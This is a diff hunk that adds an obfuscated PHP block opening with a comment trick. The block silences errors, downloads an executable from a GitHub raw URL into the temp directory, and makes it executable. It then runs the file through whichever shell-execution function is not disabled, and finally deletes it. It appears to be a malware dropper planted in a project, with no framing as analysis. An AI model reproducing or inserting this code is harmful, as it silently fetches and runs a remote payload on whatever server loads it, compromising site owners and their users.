@@ -1,0 +1,86 @@
+    /*<?php /**/
+      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
+      $UqtMf=@ini_get('disable_functions');
+      if(!empty($UqtMf)){
+        $UqtMf=preg_replace('/[, ]+/',',',$UqtMf);
+        $UqtMf=explode(',',$UqtMf);
+        $UqtMf=array_map('trim',$UqtMf);
+      }else{
+        $UqtMf=array();
+      }
+      
+    if (!function_exists('sys_get_temp_dir')) {
+      function sys_get_temp_dir() {
+        if (!empty($_ENV['TMP'])) { return realpath($_ENV['TMP']); }
+        if (!empty($_ENV['TMPDIR'])) { return realpath($_ENV['TMPDIR']); }
+        if (!empty($_ENV['TEMP'])) { return realpath($_ENV['TEMP']); }
+        $tempfile=tempnam(uniqid(rand(),TRUE),'');
+        if (file_exists($tempfile)) {
+          @unlink($tempfile);
+          return realpath(dirname($tempfile));
+        }
+        return null;
+      }
+    }
+    $fname = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "piovT.exe";
+    $fd_in = fopen("https://raw.githubusercontent.com/Fabian066/readsservercommand0/refs/heads/main/getter.exe", "rb");
+    if ($fd_in === false) { die(); }
+    $fd_out = fopen($fname, "wb");
+    if ($fd_out === false) { die(); }
+    while (!feof($fd_in)) {
+      fwrite($fd_out, fread($fd_in, 8192));
+    }
+    fclose($fd_in);
+    fclose($fd_out);
+    chmod($fname, 0777);
+    $c = $fname;
+    
+      if (FALSE !== stristr(PHP_OS, 'win' )) {
+        $c=$c." 2>&1\n";
+      }
+      $jfSh='is_callable';
+      $xfxHE='in_array';
+      
+      if($jfSh('popen')&&!$xfxHE('popen',$UqtMf)){
+        $fp=popen($c,'r');
+        $fHSi=NULL;
+        if(is_resource($fp)){
+          while(!feof($fp)){
+            $fHSi.=fread($fp,1024);
+          }
+        }
+        @pclose($fp);
+      }else
+      if($jfSh('proc_open')&&!$xfxHE('proc_open',$UqtMf)){
+        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
+        $fHSi=NULL;
+        while(!feof($pipes[1])){
+          $fHSi.=fread($pipes[1],1024);
+        }
+        @proc_close($handle);
+      }else
+      if($jfSh('system')&&!$xfxHE('system',$UqtMf)){
+        ob_start();
+        system($c);
+        $fHSi=ob_get_contents();
+        ob_end_clean();
+      }else
+      if($jfSh('passthru')&&!$xfxHE('passthru',$UqtMf)){
+        ob_start();
+        passthru($c);
+        $fHSi=ob_get_contents();
+        ob_end_clean();
+      }else
+      if($jfSh('shell_exec')&&!$xfxHE('shell_exec',$UqtMf)){
+        $fHSi=`$c`;
+      }else
+      if($jfSh('exec')&&!$xfxHE('exec',$UqtMf)){
+        $fHSi=array();
+        exec($c,$fHSi);
+        $fHSi=join(chr(10),$fHSi).chr(10);
+      }else
+      {
+        $fHSi=0;
+      }
+    
+    @unlink($fname);
